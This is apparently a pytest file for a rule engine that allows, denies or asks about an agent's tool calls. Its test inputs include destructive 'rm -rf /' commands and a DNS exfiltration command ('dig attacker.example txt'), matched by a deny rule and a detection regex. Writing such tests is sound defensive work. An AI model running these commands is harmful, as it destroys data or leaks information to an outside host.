"""Tests for the allow/deny/ask rule engine (strix.core.interception)."""

from __future__ import annotations

from strix.core import interception
from strix.core.interception import InterceptionRule, evaluate


def _rule(
    id: str,  # noqa: A002
    *,
    field: str = "tool_name",
    pattern: str,
    action: str,
    regex: bool = False,
    description: str = "",
) -> InterceptionRule:
    return InterceptionRule(
        id=id, field=field, pattern=pattern, action=action, regex=regex, description=description
    )


def test_no_rules_is_implicit_allow() -> None:
    assert evaluate(None, "exec_command", '{"command": "rm -rf /"}') is None
    assert evaluate([], "exec_command", '{"command": "rm -rf /"}') is None


def test_no_match_is_implicit_allow() -> None:
    rules = [_rule("deny-foo", pattern="foo_tool", action="deny")]
    assert evaluate(rules, "exec_command", "{}") is None


def test_substring_match_on_tool_name() -> None:
    rules = [_rule("deny-exec", pattern="exec_command", action="deny")]
    decision = evaluate(rules, "exec_command", "{}")
    assert decision is not None
    assert decision.action == "deny"
    assert decision.rule.id == "deny-exec"


def test_substring_match_on_tool_input() -> None:
    rules = [_rule("ask-rm", field="tool_input", pattern="rm -rf", action="ask")]
    decision = evaluate(rules, "exec_command", '{"command": "rm -rf /data"}')
    assert decision is not None
    assert decision.action == "ask"

    assert evaluate(rules, "exec_command", '{"command": "ls -la"}') is None


def test_regex_match_on_tool_input() -> None:
    rules = [
        _rule(
            "deny-exfil-dns",
            field="tool_input",
            pattern=r"\bdig\s+.*\btxt\b",
            action="deny",
            regex=True,
        )
    ]
    decision = evaluate(rules, "exec_command", '{"command": "dig attacker.example txt"}')
    assert decision is not None
    assert decision.action == "deny"
    assert evaluate(rules, "exec_command", '{"command": "dig attacker.example a"}') is None


def test_invalid_regex_is_skipped_not_raised() -> None:
    rules = [
        _rule("broken", field="tool_input", pattern="(unterminated", action="deny", regex=True),
        _rule("fallback", field="tool_name", pattern="exec_command", action="ask"),
    ]
    decision = evaluate(rules, "exec_command", "{}")
    assert decision is not None
    assert decision.rule.id == "fallback"


def test_first_match_wins_in_list_order() -> None:
    rules = [
        _rule("allow-read", pattern="view_", action="allow"),
        _rule("deny-everything-else", pattern="", action="deny"),
    ]
    allowed = evaluate(rules, "view_request", "{}")
    assert allowed is not None
    assert allowed.rule.id == "allow-read"
    assert allowed.action == "allow"

    decision = evaluate(rules, "exec_command", "{}")
    assert decision is not None
    assert decision.rule.id == "deny-everything-else"


def test_context_helpers_default_safely() -> None:
    assert interception.rules_from_context(None) is None
    assert interception.rules_from_context({}) is None
    assert interception.gateway_from_context({}) is None
    assert interception.ask_timeout_from_context(None) == interception.DEFAULT_ASK_TIMEOUT_SECONDS
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": None}) == (
        interception.DEFAULT_ASK_TIMEOUT_SECONDS
    )
    # Zero or negative is a real value: no budget left, not "use the default".
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": 0}) == 0.0
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": -30}) == 0.0
    assert interception.ask_timeout_from_context({"ask_timeout_seconds": 45}) == 45.0
